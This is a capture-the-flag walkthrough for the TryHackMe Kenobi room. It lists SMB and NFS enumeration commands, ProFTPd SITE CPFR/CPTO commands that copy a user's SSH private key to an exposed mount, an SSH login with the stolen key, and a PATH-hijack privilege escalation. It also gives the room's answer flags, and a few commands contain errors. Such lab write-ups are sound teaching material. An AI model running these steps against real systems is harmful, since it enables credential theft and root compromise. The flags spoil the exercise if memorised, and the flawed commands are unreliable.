# Kenobi

[Kenobi](https://tryhackme.com/room/kenobi) 

### Description:
Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.

## Task 1: Deploy the vulnerable machine

#### Question 1: Scan the machine with nmap, how many ports are open?

 1) nmap -sV -sC 10.10.165.110  
 2) **7**

## Task 2: Enumerating Samba for shares

#### Question 1: Using the nmap command above, how many shares have been found?

Nmap scripting-engine does the job: 

 1) nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.165.110
 2) **3**

#### Question 2: Once you're connected, list the files on the share. What is the file you can see?

 1) Connection to the share: Connect smbclient //<10.10.165.110>/anonymous
 2) ls
 3) **log.txt**

#### Question 3: What port is FTP running on?

 1) **21** (standard port for FTP)

#### Question 4: What mount can we see?

 1) nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.165.110
 2) **/var**

## Task 3: Gain initial access with ProFtpd
 
#### Question 1: What is the version?

 1) **1.3.5** (as seen in the nmap output from the beginning)

#### Question 2: How many exploits are there for the ProFTPd running?
 
 1) searchsploit ProFtpd
 2) **3** exploits for the 1.3.5 version shown

#### Question 3: We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. 

 1) No answer needed

#### Question 4: We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.
 
 1) No answer needed

#### Question 5: What is Kenobi's user flag (/home/kenobi/user.txt)?

 1) nc 10.10.165.110 21 (will not give a connected message)
 2) SITE CPFR /home/kenobi/.ssh/id_rsa
 3) SITE CPTO /var/tmp/id_rsa
 4) mkdir /mnt/kenobiNFS
 5) mount 10.10.165.110.21:/var /mnt/kenobiNFS
 6) ls -la /mnt/kenobiNFS
 7) cp /nfs/tmp/id_rsa .
 8) sudo chmod 600 id_rsa
 9) ssh -i id_rsa kenobi@10.10.165.110
 10) **d0b0f3f53b6caa532a83915e19224899**


## Task 4: Privilege Escalation with Path Variable Manipulation

#### Question 1: What file looks particularly out of the ordinary? 

 1) find / -perm -u=s -type f 2>/dev/null
 2) **/usr/bin/menu**

#### Question 2: Run the binary, how many options appear?

 1) **3**

#### Question 3: We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!

 1) No answer needed

#### Question 4: What is the root flag (/root/root.txt)?

 1) **177b3cd8562289f37382721c28381f02**

Note: This writeup is copied from one of my older writeups I have done in cherrytree, slowly adding all writeups to github in .md files


